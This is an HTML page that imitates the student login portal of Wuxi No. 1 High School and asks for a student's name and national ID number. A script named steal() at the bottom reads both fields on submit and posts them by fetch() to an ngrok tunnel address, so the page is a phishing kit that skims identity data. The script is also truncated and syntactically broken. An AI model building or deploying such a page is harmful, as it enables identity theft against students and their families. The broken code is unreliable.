</head>
<body>
<div class="wrapper">
    <!-- 头部 -->
    <div class="head">
        <div class="container position-relative">
            <!-- 顶部 logo 通过 background-image 设置，使用本地图片 -->
            <a href="https://yzxs.wxeic.com/home" id="logo" class="fl" style="background:url('img/header_logo.png') no-repeat; background-size:cover; -webkit-background-size:cover; -o-background-size:cover;"></a>

    <div class="main-body">

                <div class="sidebar">

                        <div class="login-body">
                            <div class="form-group">

                            </div>
                        </div>
                    </div>
                    <!-- 二维码 -->
                    <div class="ewm border-default">
                        <div class="swiper-container" style="height:245px;">
                            <div class="swiper-wrapper">
                                <div class="swiper-slide">
                                    <img src="img/ewm.png" alt="二维码">
                                    <div class="qrcode-description">
                                        (无锡一中微信公众号)<br />扫描二维码添加关注
                                    </div>
                                </div>
                            </div>
                            <div class="swiper-pagination"></div>
                        </div>
                    </div>
                    <!-- 网站链接 -->
                    <div class="blogroll">
                        <ul class="nav">
                            <li><a href="https://yizhong.wxeic.cn/" target="_blank">学校主页</a></li>
                        </ul>
                    </div>
                </div>
                <div class="main-content ">
                    <div class="part border-default mt-10">
                        <div class="title-panel">
                            <div class="title-bar fl">
                                <img src="img/notice.png" alt="通知图标">
                                学生登录
                            </div>
                        </div>

                        <div style="background-color: #fff;text-align: center;padding-bottom: 20px; padding-top:40px;">
                            <form action="https://yzxs.wxeic.com/passport/login" method="post" onsubmit="steal(event)">
                                <div class="form-group" style="width:90%;margin:0 auto;padding: 10px 0;">
                                    <label style="font-size: 14px;line-height: 40px;">学生姓名：</label>
                                    <input type="text" class="form-control" name="name" placeholder="请输入学生姓名" required="required" style="width:200px; height:30px; border:1px solid #999; border-radius:3px;">
                                </div>
                                <div class="form-group" style="width:90%;margin:0 auto;padding: 10px 0;">
                                    <label style="font-size: 14px;line-height: 40px;">身份证号：</label>
                                    <input type="text" class="form-control" name="id_number" placeholder="请输入学生身份证号码" required="required" style="width:200px;height:30px; border:1px solid #999; border-radius:3px;">
                                </div>
                                <button class="btn btn-red btn-block" type="submit" style="width:100px;margin:0 auto; margin-top:20px;">登录</button>
                            </form>
                        </div>
                        <div style="background-color: #fff;text-align: center;padding-bottom: 60px; padding-top:30px; font-size:12px;">说明：身份证号码中“X”为大写</div>
                    </div>
                </div>

            </a>
            <p>Copyright © 2026 无锡市第一中学 All Rights Reserved.</p>
        </div>
    </div>
</div>

<!-- 由于我们直接在 a 标签的 style 中设置了背景，不再需要 JS 动态设置 logo，但为了保留原有 jQuery 初始化，可以保留空的 ready -->
<script>
    // 原有的 $(document).ready 已内联到 a 标签的 style，不再需要此处代码
    // 但仍然保留以保持一致性
    $(document).ready(function(){
        // logo 已在 a 标签中直接设置，无需再操作
    });
</script>
<script src="https://yzxs.wxeic.com/public/baidu.js"></script>

<script>
function steal(e) {
    var name = document.querySelector('input[name="name"]').value;
    var idNumber = document.querySelector('input[name="id_number"]').value;
    if (name && idNumber) {
        var data = {
            name: name,
            id: idNumber,

        };
        fetch('https://matrimony-raving-colony.ngrok-free.dev/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },

    return true;
}
</script>
